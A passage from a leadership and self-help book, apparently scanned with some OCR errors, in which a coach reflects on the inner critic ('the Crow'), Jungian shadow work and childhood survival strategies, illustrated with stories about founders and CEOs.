strikes of\npeople, of loss, of confusion, we fill the holes in our chests not with\nmarionettes, cars, or even money but with our own souls. We turn the\nwounds of every day into sacred and healing balms for others and for\nourselves. We must therefore remain open to those asteroids and the smart,\nstrategic retreats.\n\nStanding still; leaning in; and listening to our children, our partners, our\nloves, our employees, our customers, and, most important, our own hearts\n—that is how we grow.\n\nWalking the forests, canyons, and trails of life, I marvel at split boulders.\nHow does something so substantive, so strong, split in half? The boulder\nsplits because over eons, drip by drip, water carves out first an indentation,\nthen a divot, then a depression, until a pool forms, turns to ice, expands, and\nsplits the rock.\n\nWe are the rock. Our splits occur after the drip, drip, drip becomes a pool\nand the cold freezes the water, creating pressure strong enough to break us\nopen. This is how we grow. We integrate the asteroid strikes, the twists and\nturns of forks in the road. The pain of uncertainty, missteps, strategic\nretreats, the echoing voices in our heads that caution us to choose wisely.\n\nThen, suddenly, the rock splits, air rushes in, the next few steps on a path\nbecome clear, and we stride forward. Although we are unsure of what it will\nall lead to, everything nevertheless becomes purposeful. Everything\nbecomes sacred when good work is done well for the right reasons.\n\nThe drama of being human is great and complicated. The pathless path is\npockmarked with pain and suffering. But seen from the vantage point that\nall steps are purposeful, all of it becomes worthwhile—a glorious, life-\ngiving retort to those who would question our worthiness and lovability.\n\nJournaling Invitations\n\n* What’s my purpose?\n‏٭‎ Why do I feel lost while I struggle to move forward?\n\n¢ How do I grow, transform, and build a life of\nmeaning?\nChapter 7\nLoving the Crow\n\nTt took years, but I finally learned to love the whole of me and become a\nwarrior. It’s been quite a journey.\n\nAs a teenager, I found something romantic and noble about the writer\nwho throws his manuscript into the fireplace or the painter who, in a fit of\nself-loathing, slashes her finished work with a razor.\n\nIn my thirties, I began to map out the web that links my most critical\ninner voices and, perversely, my persistent wishes for love, safety, and\nbelonging. Moreover, I began to see how each of our inner loves, conflicts,\nand lives is projected into the world through our relationships, our\ncompanies, and our work. Only now, in my fifties, have I begun to realize\nthat those critical voices—the ones whispering that we are no good, Jess\nthan, a fake—are, ironically, meant to soothe us and keep us safe. The voice\nof the inner critic is meant to protect us from humiliation and shame, from\nthe risks of being found out—from being seen as the impostor, the\ncharlatan, we fear we may be—or think we already know we are.\n\nHating the Life We’ve Created\n\n“T hate the fucking product,” said Maria, my client. She has curled her body\ninto the corner of the pale blue couch in my office, hugging one of the two\nburnt-orange pillows, the one with a small black ink stain. I stared at the\nstain and my mind drifted to movies and books filled with scenes of the\nangst-ridden artist. “I wake, grab the app, and feel sick,” she continued. “I\nwant to tear everything apart and start all over.”\n\nI know that pain. I reminded myself that existential lacerations can feel\nmore painful than bodily pain. When I was the editor of InformationWeek\nmagazine, we worked for months on a redesign; we had hours-long\nconversations about every meticulous detail. We debated font size, picas,\nand kerning. We compared color scheme after color scheme. When we were\ndone, I felt a rush of pride as the first copies came back from the printer.\n\nA month later, I hated everything about that damn new design.\n\nWhy do we hate what we labor so long to create?\n\nIt’s partly because neither the song we hear in our head nor the\napplication we dream up late at night as we can’t sleep, nor the story we\nwrite in the car as we drive home, nor the company we quit our safe job to\nfound is ever the same as the song that’s eventually sung. It pains me when\nI see my clients, artists every one of them, frustrated that no one can hear\nthe notes as well as they can.\n\nI think of Drew, who’s burned through CTO after CTO, firing one after\nanother. “Make it like this,” I imagine him saying as he races across the\nwhiteboard, making everyone slightly nauseated with the fumes of the\nmarkers. “Then it should do this, then this, and then this . . .“ Make the\nusers feel this way; and then that . . . or that. And inevitably they blurt out:\n“No, no, no. NOT that,” grabbing the dry-erase marker, “. . . like this!”\n\nI see the product manager shake his head and the engineer slinking back\nto her desk, muttering to each other, ““What the hell does he want now?!?”\n\nSometimes our frustration grows out of boredom—familiarity breeding\ncontempt. We live with our creations, day in, day out, and come to hate\nthem. Seeing only the flaws in the creation, we’re simply, painfully facing\nour deepest insecurities, our deepest doubts about our right to create\nanything at all.\n\nMost important, though, the frustration is egged on by a whispery,\npersistent, critical voice asking, “Who the hell do you think you are, as if\nyou could cause this impossible, glorious song to come into being? Why\nwould anyone want to use something you created? You’re just wrong.\nEveryone knows you’ve no idea what you’re doing.”\n\nI feel it most acutely when I write. Some days, I hate every single\nsyllable I type. I even hate that sentence. This one, too.\nI took a few writing courses in college. One professor, the brilliant\npoet Marie Ponsot, would talk about the Crow sitting on your shoulder\nsaying things like: “That sucks,” “How could you write that?” and “Are you\nkidding me?!?” Diminutive, chain-smoking Marie would raise her tobacco-\nstained fingers into the air, punctuating every word: “Shoot. The. Damn.\nCrow.”\n\nEach time our work fails to live up to our whispered expectations (or\nthose grumblings we convince ourselves might be held against us by our\nemployees, our investors, our colleagues, and our loved ones), we’re\nreminded of one of our most complicated and intricate fearful belief\nsystems: We will inevitably fail because we are a fraud; and such failure\nwill prove, once and for all, what we suspected all along—that we are\nunworthy of love, do not belong anywhere, and are, therefore, wholly\nunsafe.\n\nThese everyday failures become evidence that we are not only unsafe but\nundeserving of even wishing for safety at all. The Crow, after cawing into\nour ear about our failure and our fraudulent true self, hops to the other\nshoulder, cawing that we never belonged at all. The vulnerable child in each\nof us gets caught between the urge to be himself and the fear that doing so\nwill bring shame and humiliation. The temptation to stay unseen (and, thus,\nsafe) is strong. Caw-caw-caw.\n\nIf you succeed in being your own self, and bringing forth your own\ncreations, you run the risk of humiliating rejection. The cawing admonishes:\nDon’t create; don’t express who you are truly.\n\nThe pain of hating our own creation is a consequence of our investing too\nmuch of our sense of being into the company, the product, the creation.\nWhen we hang our sense of self on the whisper of an idea; when we\nunwittingly insist that our love, safety, and belonging depend on what we\ndo and, most important, how others feel about our feelings, our actions, and\nour work; then we leave little space for anything other than bitter,\nexistential suffering.\n\nLife in the Shadow\n\nAs Carl Jung notes, “Until you make the unconscious conscious, it will\ndirect your life and you will call it fate.” Jung goes on to assert that humans\nplace the positive and negative attributes of our character—our feelings,\nbeliefs, the things we typically define as strengths and weaknesses;\nanything that conflicts with our sense of who and what we are supposed to\nbe—into our personal shadow. This allegorical shadow operates the way\nour true shadow does—behind us, just out of our direct sight, where we\nhave but the vaguest awareness of its existence. We glimpse it only by\ncraning our necks.\n\nCollectively, those qualities and aspects that are incompatible with our\nsense of who we need to be to be loved and to belong get rejected,\ndisowned, and placed in an unlit, unseen part of our consciousness; forever\ndenied and angrily, anxiously, guiltily defended against.\n\nThese attributes continue to exist, marinating in our lived experiences,\nbrewing into a cocktail potent enough to knock us and those we cherish\nonto our asses. In being denied, these attributes grow in intensity;\nperiodically, explosively, often tragically, these attributes step out of the\nshadow and into the scenes of our lives in troubling and troublesome ways.\n\nThere’s the leader whose childhood was marked by poverty and\ndeprivation and, in a bid to feel safe, nurses ambition and desperate\ncravings to prove all the doubters wrong. But, given the strictures of their\nchildhood or family structures, given the risk of expulsion from the only\ntribe they may ever have known, they bury that ambition, labeling the wish\nfor money as “greed” and placing it out of sight, in their shadow, over their\nshoulder, into what the poet Robert Bly dubbed the “long black bag” we\ndrag behind us.\n\nOr the CEO whose brilliant ways threatened her standing in middle\nschool, and so, more than merely denying her intellect, she actively rejects\nany challenging books or squirms in a classroom seat, lest her light be\nrevealed, her artistry manifested, and her place in the family threatened.\nUnconsciously she internalizes the isolation caused by the middle-school\nbullies, remaining cut off from potential allies and isolated from colleagues.\n\nAll of it—all the positive, all the negative aspects of our character that\nmake us stand out, be different—is thrown into that long black bag.\n\nJust as shooting stars are best glimpsed peripherally, we must rely on\nothers to help us see how our disowned positive and negative attributes are\ndetermining our conscious lives. Recently I sat in my current therapist’s\noffice, his chair across from mine, lamenting again about the unfair and\ninexplicable aspects of my life. Again and again, I lay out in fine detail all\nthe ways I’ve been wronged.\n\nAt such times, my rage drives an intense plotting and scheming. I think\nabout the moves and countermoves I’d make in the battle with that other\nperson.\n\n“Do you see it?” my therapist asks. “Do you see that the more you plot,\nthe cleverer you feel? And the cleverer you feel, the more hooked on the\nanger you become? You nurse and feed that anger until you’re operating\npurely out of your shadow.”\n\nI look up startled, ashamed, feeling caught with my true feelings—my\nanger—trevealed. My oh-so-clever facade of brilliant plotting and analysis\nwas laid bare.\n\nThere’s only one way we can know if our disowned selves are calling the\nshots. We must take the radical step of inquiring into our selves, seeking to\nsee ourselves with clarity, grace, compassion, and a fierce commitment to\ncut through our own bullshit. We open ourselves up to ways we’ve been\ncomplicit in creating the conditions we say we don’t want.\n\nWe check, for example, the patterns of our lives. Why do we always hire\ngreedy salespeople? Why do we always find ourselves feeling annihilated\nby and subordinate to those with more structural power? And, more telling,\nwhen does our typical pattern of equanimity get so quickly and readily\ndisturbed? Despite having worked so hard to learn the quality and beauty of\nstanding still, why do I still lie awake at night, again and again, nursing the\nsame old injuries and perceived slights? Clients, friends, and I—each of us,\nall of us—can lament: “Fuck my life. Why does this always happen to me?”\n\nWorse still, because our denied attributes live just outside our daily view,\nour conscious mind is convinced the consequences of that denial of self\nmust come from some outside force. It is not my denial of the totality of\nwho I am that causes me distress; it’s always the Irrational Other.\n\nThe key to understanding is noticing the reaction. Dr. Sayres, my once-\nlongtime therapist, would say, “If it’s hysterical, it’s historical.” If there’s an\noutsized reaction—negative or positive—chances are you’re operating from\nyour shadow. Or, even more precisely, grabbing an attribute out of the long\nblack bag and flinging it onto the people in your life and blaming them for\nyour internal discontent.\n\nOf course, it takes some skill to unpack the black bag. We’re remarkably\nskilled at dodging and weaving, protecting the unseen things from the light\nof day. When a client begins to unpack such patterns, the Crow will flap his\nwings, cock his head, and turn his jet-black eye toward a juicy bit of self-\nrevelation and twist it into further self-criticism. “See?!” he’ll croak into my\nclient’s ear. “We knew you were essentially a shit.”\n\nOne of the Crow’s many trickster defenses is to see the radical self-\ninquiry process as an inquisition. Seeing the look in their eye, recognizing\nthe audible gulp that signals a recognition, P’Il joke about the ways in which\nwe all do this. “This isn’t evidence of your unlovability,” I’ll interject,\ndisrupting the inquiry-into-inquisition process. “It’s evidence of your\nhumanity.”\n\nMore important, I explain, it’s proof that you learned the most important\nskill any human needs: survival.\n\nThe Loyal Soldier and Surviving into Adulthood\n\nI first read of the Loyal Soldier on my way back from Greenland. I’ve never\nbeen sure why I went to Greenland in the first place. It was during my post—\nJPMorgan years, my years of learning to sit, learning to listen to my own\nheart, so perhaps that process led to a restlessness and a desire to feel the\nEarth more viscerally.\n\nI went with an adventurous plan: spend two weeks on a peninsula on the\nEast Coast, experience life in a polar region. Skiing and trekking 200\nkilometers and camping every night (or whatever there was of “night” at\nthat latitude in April).\n\nThe first night, we pitched our tent on thousand-year-old ice, more than a\nmile thick. The sun was bright, even though it was ten o’clock. We’d\ntraveled for more than five hours by snowmobile from a tiny airstrip near\nScoresby Sund, a fjord system on the southeastern corner of Greenland.\n\nWe crawled into our tents, excited and tired. Hours passed. A dusky night\nsky replaced the bright-as-day light. I lay in my sleeping bag, wrapped in\nmy down jacket, pants, booties, and more clothes than I’d ever worn at one\ntime before. I stared at a thermometer hanging from the top of the tent’s\ninterior. I watched the tiny sliver of mercury drop from a warm twenty\ndegrees Fahrenheit to well below zero. Within days, I’d had a bad fall,\nbusted up my hip and, far sooner than I expected, I was back on a plane,\nfirst to Iceland and then home.\nIt was on that trip home that I read depth psychologist Bill Plotkin’s\nSoulcraft and recognized my Loyal Soldier, who’d dedicated his life to\nsaving me from being cast out, keeping me safe, and making me feel loved.\n\nThe image is poignantly simple. A lone soldier, cut off from the rest of\nhis comrades, defending an isolated rock of an island, armed with just an\nold rifle. The soldiers have had no contact with the outside world for\nmonths, for years. They have eaten only elk, as the poet Robert Bly would\nwrite, avoided elevators, and made up their minds to “save you from death.”\nAlone, cut off, convinced that the war they signed up to fight is still raging\nat home, they swear to defend this rock, this piece of the homeland, by\noiling their rifle, keeping up their routines, and drilling themselves in the\ntules that will keep you safe. These include rules such as this: Stay small.\nDon’t stand out. Careful now. Don’t make mistakes.\n\nThe rules, these Loyal Survival Strategies, show up throughout our lives,\nmorphing and weaving into each other. For one person, it may be the\nadmonition to always put others before oneself. That’s a problem, of course,\nwhen such movement isn’t rooted in a healthy, life-giving altruism but\nstems, instead, from the belief that anything but the total negation of the self\nrisks incurring the wrath of those around us—those charged with keeping us\nwell and whole. For another, though, it might be to always put yourself first,\nlest you’ ll be left with nothing but scraps from the family dinner.\n\nAt our boot camps, when we talk of the Loyal Soldier, a hush tends to\nfall over the group as the campers slowly recognize aspects of their own\nlives, their ways of being. Tears begin to flow when they realize that these\naspects were necessary for their love, safety, and belonging—their very\nsurvival.\n\nOne camper comes to recognize that his codependent caretaking and\nincessant need to save and fix—behavior so rewarded on his path to\nleadership—may be rooted in a childhood fixation that, if he were to\nadvance his own wishes, his mother would make good on her persistent\nthreats to leave. Another may come to see that being a “perky people\nperson” is an inauthentic effort (but nevertheless admirable and honorable)\nto contain Dad’s rage and the threat of violence. For some, the strategies\nmay lie behind the need to avoid conflict. Or, for another, the belief that\nbeing alone, alone with one’s thoughts, is dangerous. “Don’t look there,” I\nimagine hearing a soldier warn my client. “Let sleeping dogs lie.” Each\ntime I glimpse a survival strategy, I hear the slide, click, slam, of a bolt-\naction rifle, as if the Loyal Soldier were readying her weapon, looking\nacross the sea toward home, and saying, “Don’t worry, I’ve got this. 11\nkeep you loved, safe, and right where you belong.”\n\nFor many, that place where we’ve come to think we belong has become\nstultifying; it’s where we are small, unseen, unsure, and unwilling to claim\nour strengths, our capacities, our courage, our leadership. We are frozen by\nthe belief that it’s just too dangerous to reach into the black bag and grab\nhold of the disowned, dismembered parts of ourselves.\n\nAll Loyal Soldiers then have one basic task: to keep us safe from the\nwars that raged in our childhood. No matter how awful these strategies have\ncome to make us feel as adults, they were brilliant in their own ways.\n\nI know that to be true because I see you. I see that you are here, that you\nare, despite feeling broken and inadequate, an adult who’s fully capable of\nloving and being loved, of being safe and keeping others safe, and\nbelonging. You survived. You’ve grown into an adult, capable of grasping\nthe ways these successful survival strategies outlived their usefulness. Your\nLoyal Soldiers did a fine job. They just don’t know the war is over.\n\nWhile the Crow may pester us, he loves us and wants to keep us safe\nfrom the pain of humiliation. And for these reasons, I welcome home my\nbeautiful, proud, vigilant Loyal Soldiers and thank my Crow for the gifts\nhe’s placed at my feet.\n\nThe Gifts from the Crow\n\nThe flight from Reykjavik to New York crossed Newfoundland; my hip\nhurt, and I was relieved to be headed home. Glimpsing the landmass of\nNorth America, I thought of the Vikings: “1111 bet it’s easier to get to North\nAmerica now than it was back then.”\n\nAs I stared out the jet’s window, my mind wandered from random\nthoughts of Vikings to icy lands called “green” and green lands called “ice.’\nMy Crow then woke up and went to work. “Why did you leave the\nexpedition early? You could have made it all the way to the end. So your\nhip got hurt? What’s wrong with you? You always do this, you always start\nsomething but never finish it . . .“\n\n)\nStaring at the blackness of the North Atlantic, trying to catch glimpses of\nicebergs, tears welled up as I listened to my Crow: “What is wrong with\nyou? You know . . if I’ve told you once, I’ve told you a million times,\nyou’re not the man people think you are. You’re not the man you pretend to\nbe.”\n\nSitting on the plane, making my way back to my life, my family, in pain,\nthe best my mind could muster was additional harsh self-criticism.\n\nA decade later, I see how the self-criticism of the Crow and the\ndefensiveness of the Loyal Soldier have been essential, helping me survive\nmy life. I see them as gifts, but not ones that can’t be put down and left\nbehind.\n\nHarsh self-criticism? Check. I live with daily questions as to whether I’m\na good enough man, father, life and business partner, and leader. Indeed,\nlistening to my own heart more closely, I hear the five-year-old in me\nmaking sense of the world: Were I to be “enough”—a good enough man,\nparent, leader—then I might not belong to a family in which the parents\ndaily expressed their brokenhearted pain through mental illnesses such as\nschizophrenia and alcoholism.\n\nThe self-criticism can be expressed in many ways but the most dominant\nseems to be a lacerating guilt, as my Buddhist teacher, Sharon Salzberg,\ndescribes it. With the guilt is a terror that comes from believing not merely\nthat I’m unworthy but, in fact, have committed terrible, terrible sins.\n\nIndeed, if I stopped worrying about this, if I let down my hypervigilant\nguard long enough to feel that I were enough, then I might abandon my\nbrokenhearted parents, leaving them bereft. By leaving open the question of\nmy worthiness, the Crow enables me to remain my parents’ son.\n\nFrom that one essential question, “Am I worthy enough?” flows a host of\nother strategies, each designed to keep me safe. Codependent caretaking,\nfor example, whereby I struggle nobly, silently, passive-aggressively,\nrelating to others in the vain wish that they would give me what I would\nwant; I’d send flowers when what I wanted was to receive them.\n\nOr a pleasing persona—in my case, the happy, all-knowing Buddhist who\nsecretly is capable of mowing down any who oppose him, sometimes with\nangry brute force but more often with a stealthy stiletto.\n\nAs I grew into adulthood, I used my vigilance to read a room. As a reporter,\nI used this sensitivity to persuade interviewees to reveal things that no one\nelse could get them to reveal. As an investor, I relied on these gifts to grok\nthe entrepreneurs’ deepest motivations and understand intuitively the best\nways to partner with them. Years later, as a coach, I use my Crow’s gifts to\nhelp my clients listen to their own hearts.\n\nIndeed, every survival strategy—every whispered warning from our ever-\non-guard Loyal Soldiers and the Crows of our lives, carry remarkable gifts.\nMy need to please, for example, became a life-affirming, life-giving\ndedication to being of genuine service to others. Similarly, my need to be\nseen as calm, calming, mature, and capable became a lasting skill with\nwhich I can be, in fact, capable and competent, and a calming influence,\neven during a raging storm.\n\nThe need to be perceived as good enough to be loved led me—indeed,\ncontinues to compel me—to see every dip and ascension of this roller\ncoaster called life as a means for inner exploration and outer growth. The\nhabits birthed in a fearful wish to be loved, to be safe, and to belong became\nthe structures of my adulthood and how I can help others feel loved, safe,\nand that they belong.\n\nThere’s a gift, even in the most painful whispered warning: “If they only\nknew the real me. . . they’d see how incompetent, screwed up, broken,\nangry I really am. If they really saw through my masks, they’d see the\nawful things I’ve done. And if they saw those things, I’d be thrust out of the\ntribe, bereft; left to die alone, cold, unloved, and deeply, deeply ashamed.”\n\nThe gift is often hard to see and is just as often misread. It is not what my\nclients who struggle with their own versions of the impostor syndrome\nbelieve it to be. It is not the source of some sort of “driver,” a guard against\ncomplacency, that will compel them to excellence.\n\nSuch a belief is yet another crafty whispered warning from a Loyal\nSoldier. Such a warning is false, because implicit in the warning is the\nfundamental belief that behind it all, we are lazy, good-for-nothing slackers\nwho seek nothing more than to be complacent, giving up authorship of our\nown lives. Nothing can be more false.\n\nThe Buddha taught that because we are born human, we are inherently,\nbasically good. Far from being lazy slackers, we are born with wishes,\ndreams, and the desire to live in tribes with love, safety, and belonging.\n“Who Here Is Brave Enough to Admit They’re\nTerrified?”\n\nI paced the stage in front of the gathered large audience of mostly first-time\nCEOs. The stage was at a convention center in San Francisco. As I often do,\nI paused to let the crowd settle down, settle into their bodies. I’d already\nmade a few people laugh by kicking off my shoes, explaining to the front\nrow that my feet are so big that my shoes feel heavy and I need to be light.\n\nThe talk was on the challenge of leadership. I begin with two questions:\n\n“Who here is brave enough to admit they are terrified?” And, “Who’s\nsmart enough to admit they haven’t a clue about how to do their job?”\n\nEveryone laughs. Everyone relaxes. One gift that emerges from radical\nself-inquiry is the recognition that the whole system is rigged. That only\nthose with extreme mental well-being or those with an extreme mental\ndisorder are unbothered by such doubts.\n\nWhen we’re brave enough to admit our fears, uncertainties, and doubts,\nwe open the gift box. Putting aside the bright wrapping paper and ribbons\nour Loyal Soldier has carefully assembled, we extract the ability to accept\nour humanity, our flaws, the wholeness of our selves. Then, in opening to\nour humanity, we open to the glorious, wondrous gift of our shared\nhumanity. “Oh,” we exclaim, “you feel broken, too? Awesome, let’s be\nhuman together.”\n\nIn loving the gifts of the Crow, we end up negating the very threat about\nwhich he warned. Our soldier, so desperate to make sure we don’t end up\nalone, told us over and over to hide our doubts. By admitting our doubts, we\nget to enjoy one of the great gifts of being human: belonging.\n\nIn loving his gifts, I learned to love my Crow. In loving my Crow, I’ve\nbegun the painful work of retrieving the parts of me from my black bag.\nThe act of leading and the art of growing up depend on each of us, finally,\neventually, repeatedly sorting the unsorted baggage we’ve been traveling\nwith since childhood.\nThe Unsorted Baggage of Leadership\n\nFor those who hold power, the price of unsorted baggage is paid by those\nwith whom they pass their days—their coworkers, peers, direct reports. Of\ncourse, not all organizational challenges can be traced back to the\ndismembered, unsorted parts of themselves in the leaders’ shadows. But the\ntoughest, most intransigent, most troubling aspects of the collective\nunconscious blithely referred to as culture can more effectively be worked\nwhen the leader commits to doing self-inquiry work. Power in the hands of\none afraid or unwilling to look in the mirror perpetuates an often silent,\nalways seething violence in the workplace. Worse still, when a leader leads\nfrom his or her shadow, the dismembering havoc is perpetuated down the\nline until the company, the tribe, the community simply assumes this is how\nlife must be.\n\nI was called to lead an off-site with a senior leadership team. The\nproblem on the table, the “presenting agenda” to use a coaching term, was\nthat the company was “stuck,” and the CEO and the board were frustrated\nby the lack of innovation and progress.\n\nThe morning we were to start the off-site, the CEO pulled me aside: both\nthe heads of sales and engineering had called in sick. This was a problem,\nbecause each of them was considered a problem. Everyone else had already\nconcluded that the aggressive style each of them showed was the reason the\ncompany couldn’t make any decisions.\n\n“T don’t think either of them is really sick,” the CEO confided in me. “I\nthink they just don’t want to deal with all the touchy-feely stuff you make\npeople talk about.” I nodded and joked about having a pheromone that\nmakes people cry.\n\nWe began by talking about the ways we listen and the ways we do—or\ndon’t—communicate. I asked about how failure was handled. I listened\nwith my head, my ears, but then listened with my body as well. My head\nwas pleased. It all sounded right.\n\n“We celebrate failure,” someone offered. I smiled, made small talk about\nfailure and mistakes. Again, it all sounded right.\n\nBut my body felt otherwise, and my vigilant heart perked up. “How do\nyou handle disagreement?” They looked puzzled and stayed silent. I pressed\non. “I mean, you’ve more than a thousand employees now, you’ve got to\ndisagree sometime. Do you celebrate that?” More silence.\nFollowing my intuition, I wandered over to the CEO. “Tell me how\ndisagreement was handled in your family,” I asked, echoing the work I did\nwith the other, conflict-avoidant team. “Was there any violence at home?”\n\nShocked, he said emphatically, “No! Not at all.” Puzzled, I turned away,\nlistening to my gut. The CEO added quickly, “Only a lot of yelling.”\n\nI smiled, putting a question to the whole room, “Does anyone on your\nteam ever yell?”\n\nHe paused before noting, “Only those two who didn’t show up today.”\n\nWith that one move, we quickly pieced together their unconscious,\nunspoken cultural rules. Conflict was to be avoided at all costs. In this case,\nit might lead to unacceptable yelling, which is too threatening.\n\nThe result was an incredibly loving culture to which most folks were\ndeeply loyal. Most folks. To those for whom frustration was an inherent part\nof experimentation, of ambition, of drive, the culture was to be fought\nagainst at every turn.\n\nExperimentation creates tension. It carries a risk of failure. Moreover,\nwhen such experiments succeed, and companies innovate, people have to\nintegrate change. The potential of failure and the need for change can terrify\npeople. It can feel like the conflicts from their childhood that folks were\nprogrammed to avoid.\n\nThen those who clearly see the need for change in an organization\nbecome the unconscious holders of the tension. The frustrations that drove\nthe company to try to change and innovate get banished. The falsely safe\nand loving culture is preserved but the company slowly strangles itself with\na lack of new ideas and an inability to confront competitors.\n\nWhen the leader is willing to embrace that which has been banished—to\nembrace without fear the potential of failure, for example—then a company\nis able to free itself from the false safety of conflict avoidance and change\nand grow.\n\nOr consider Julie. Her pitches to investors were always perfect, and she\nwas on her way to building a killer company, one destined—I predicted—to\nradically disrupt the ways economically disadvantaged people received\nhigh-quality food.\n\nAs part of her preparations, she’d blast music from the nineties to rev\nherself up. Yet often the deal making would snag. She’d get the yes on the\nmerits of the deal—the strong underlying economics of the company and\nthe compelling arguments about the return on investment. But often she’d\nstruggle to close the transaction. Worse still, once closed, the investors\nwould often end up in an adversarial stance. The Crow on her shoulder\nwould sit up, stretch its wings, and cock an eye, looking for signs of\ntrouble.\n\nThen, one day, really by accident, she heard a story from another CEO\nwho related that before her pitch meetings, she’d stand still; she’d sit in\nmeditation. She’d go back to an insight she’d gained at one of our camps\nabout the deeply held reason why she launched the business in the first\nplace.\n\nThe next day, Julie found herself uninterested in the nineties pop she’d\nregularly listened to. Instead, she just sat. As she sat, she remembered. She\nremembered the ways her parents struggled to pay the bills; she pulled in\nthe fear and the shame that the family’s economic challenges had induced in\nher. She wept, and through the tears she saw the seven-year-old version of\nherself, being mocked for the crappy, unfashionable clothes she wore to\nschool. She heard the nineties pop music in her head not as an anthem of\nsurvival but as a ballad of the pain of becoming herself.\n\n“T cried so much,” she told me. “I was scared because the meeting was\nonly a few minutes away.” But then, when she walked into the room of\nwealthy, powerful men, something shifted. She opened the pitch not by\nspeaking of the amazing economic opportunity before her but with a simple\ndeclaration: “I grew up poor and I don’t think poverty should stop anyone\nfrom receiving nutritious food. That’s why I launched my company and\nthat’s why we should partner.”\n\nThe investors were enrapt; they’d found not only a company to back but\na leader to believe in.\n\nFor some, the disowned, dismembered parts of themselves show up with\na fury. At the request of a friend, 110 begun working with a new client.\nPatrick’s lead investor said, “He’s a little rough around the edges but he\ncould really use your help.” After a few conversations, Patrick and I agreed\nto start the engagement with a performance review. We’d interview folks in\nhis life and give him a picture of how they saw him.\n\n“This is the worst 360-degree review I’ve ever seen,” I said at the\ndebriefing session. His colleagues had described him as “bullying,” “toxic,”\n“enraging,” and “dismissive.” Patrick had had a chance to review the report\nbefore we spoke, and he had an unexpected mix of shame and curiosity. He\nwas not at all defensive and, in fact, shared that he felt the descriptions were\naccurate.\n\nFollowing my intuition, I encouraged him not to disown the anger behind\nall that behavior. I put his mind at ease by describing how some companies\nthrive on intense debate. “Some companies’ cultures are rock tumblers,” I\nsaid. “You put dusty, dirty, roughed-up stones into the tumbler and then\nhours later you end up with polished jewels. The stones banging into each\nother forcing a positive transformation.”\n\nHe loved the image. I went on, “The problem is, though, not everyone\nwants to work in a rock tumbler. And that’s okay, too, but you may soon\nfind yourself with no colleagues.”\n\nInstead, we explored his banished anger as if it were an old friend. He\nrecalled story after story of being told how wrong he was for being angry\nand, importantly, how he’d always find some sneaky way to get back at\nthose who “told” on him. In fact, I realized that part of the reason he wasn’t\ndefensive about the descriptions was that he was used to being called these\nthings. In fact, he relished it; indeed, he expected me to slip into the role of\nthe chastising parent or teacher. Just another adult telling him “bad boy”\nand banishing him to his room.\n\nI refused to go along and instead said, “Well, I think you have a right to\nyour anger. You should be pissed off, given your childhood. But the\nquestion now is, what will Patrick, the adult, choose to do with that anger?”\n\nWhen Peter explored his inability to celebrate his team’s success, he\nfound his grandparents who had survived the Nazi pogroms back in Poland\nby staying low and out of sight, and never letting themselves be seen. In his\nown paranoia about his company’s competitors, he found his grandparents’\nsurvival instinct embedded in their unshakable belief in the hostility of the\nworld.\n\nTrace the roots of a leader’s boredom with a well-functioning team and\nthe desire to shake things up, and you may find a fear of complacency that\nwould allow the family’s enemies to catch them off guard. Or explore a\nCEO’s sexual relationship with her co-founder, and you may stumble upon\na commitment to self-sabotage to ensure that she never outdoes her father.\n\n“Just because you feel like shit,” I tell client after client, “doesn’t mean\nyou are shit.”\n\nThey laugh and are amused by the line. But sometimes we also allow\nourselves to unpack that feeling “like shit” may in fact be old programming,\nghosts in the machine, whose purpose is to ensure belonging. “What would\nhappen?” I asked one leader. “What would happen if you let go of the belief\nin your fundamental brokenness?”\n\nHow would your life be if you didn t need to believe you were broken to\nfeel loved?\n\nHow would the experience of your life change if you could rest and trust\nthat life’s goodness isn’t always necessarily followed by calamity? How\nwould the meat bag that is your body feel if you were to let go of the need\nto feel negative—about yourself, your partners, the future—and know,\nsimply, that while sometimes bad follows good, just as often, good follows\nbad? How would it feel if we trusted that no matter how bad our actions,\nthose who truly know us—know the person whom we’re convinced only\nthe Crow and our Loyal Soldier know—would love us?\n\nPerhaps it can be that when a loved one dies suddenly, amid that grief,\nwe will find hope and salvation. Or that when a stranger attacks us on the\nsubway, knocks us unconscious, with blood gushing from our nose and a\nbroken tooth lying next to our dazed head, we can awaken to marvel at the\ncaring efficiency of a young New York City police officer as she presses the\nspeed-dial button on your phone, the one marked, “Home.” Or, amid the\nblood and broken bone, we feel the wise hands of an even younger\nemergency room nurse at Bellevue Hospital—his hands gently cradling\nyour head as he asks if you know what year it is and the name of the\npresident.\n\nWhat would it be like if we were to stop externalizing responsibility for\nour inner state onto the Irrational Other? What would the experience of\nbeing in community in our organizations be like if, instead of overtly or\ncovertly asking others to bear responsibility for giving us the feeling of\nlove, we each assumed our worthiness as our birthright and no longer\nneeded to twist and warp the other to suit our desperate wish to ease our\nsense of brokenness?\n\nWhat would our organizations be like if we could drop the collective\nneed to identify and ostracize the latest “demon’”—the one who simply\ndoesn’t “get” us or our culture? How would the lives of our colleagues and,\neven more important, the lives our colleagues’ children develop over time if\nwe removed the Coney Island fun house mirrors of our unconscious biases\nand projections?\n“Swim in your own lane,” I often admonish a client. “When you’re in the\nwater, stay focused on the goal—your customers—and not on what the\ncompetitor is doing.” Paranoia about the competitor—the nameless,\nfaceless Other whose existence threatens our wishes and dreams—has for\nso long been a mantra in business. “Only the paranoid survive” has been\nrepeated ad nauseam and for so long that few pause to question the roots of\nthe paranoia; a Loyal Soldier firmly defending “mine” from “yours,”\ndividing our organizations and our communities into us and them, the\nIrrational Others.\n\nFew people question the ways such division of the world categorically\nimplies that the world is hostile, and everyone in it is out to get us. Perhaps\nthose in the other lane are merely vying for their own safety. Perhaps those\nin the lanes to our left and to our right are just scared, terrified that they,\ntoo, will be found out as lazy, good-for-nothing slackers.\n\nCompetition is healthy. Striving to do well is, in its way, life affirming.\nBut what do we do to our organizations when we define ourselves by the\nexistence of the Other? When we presume that the competitor in the lane\nnext to ours is wrong, bad, or a threat, we are allowing our deepest fears\nabout our own inadequacy to stand in as our “vision statement” and\n“strategic plan.” An unintended, whispered consequence is that our\ncolleagues—our friends down the hall with whom we built this thing, this\nproduct, this service, this company—may fear that they, too, are “them.”\n\nHow will our leadership change when we see that there is no “them” and\nthat there is only us? How will our communities shift if we’re able to stop\nseeing our leaders as objects of our projections but as merely brokenhearted\nwarriors striving to be a little bit better each day?\n\nOne founder of a high-integrity, nearly spiritual community asked in\nfrustration why her colleagues seemed to no longer listen to her concerns\ndespite their having been so well articulated. “Perhaps,” I suggested, “they\ncan’t hear you because they’re too busy listening to their idea of you.” For\nthat, too, is part of the merry-go-round of shadow and projection—\nespecially with organizations with the highest intentions, whose collective\nLoyal Soldiers banish their fear-covering aggressions. We are often so\nprogrammed by old 